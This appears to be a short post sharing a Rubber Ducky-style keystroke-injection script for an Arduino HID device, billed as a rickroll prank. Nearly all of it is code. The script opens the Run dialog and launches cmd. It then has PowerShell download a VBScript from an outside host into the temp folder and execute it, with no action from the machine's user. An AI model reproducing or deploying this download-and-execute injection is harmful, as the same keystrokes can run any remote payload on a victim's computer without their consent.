GitLab repo: https://gitlab.com/WarKitteh/arduino-hid-rickroll

Ducky code:&nbsp;
`DELAY 1000&nbsp;
GUI r&nbsp;
DELAY 100&nbsp;
STRING cmd&nbsp;
DELAY 100&nbsp;
ENTER&nbsp;
DELAY 100&nbsp;
STRING powershell (new-object System.Net.WebClient).DownloadFile('https://pixelcoding.nl/download/rickroll.vbs','%TEMP%\rickroll.vbs'); && start %TEMP%\rickroll.vbs && exit&nbsp;
DELAY 100&nbsp;
ENTER`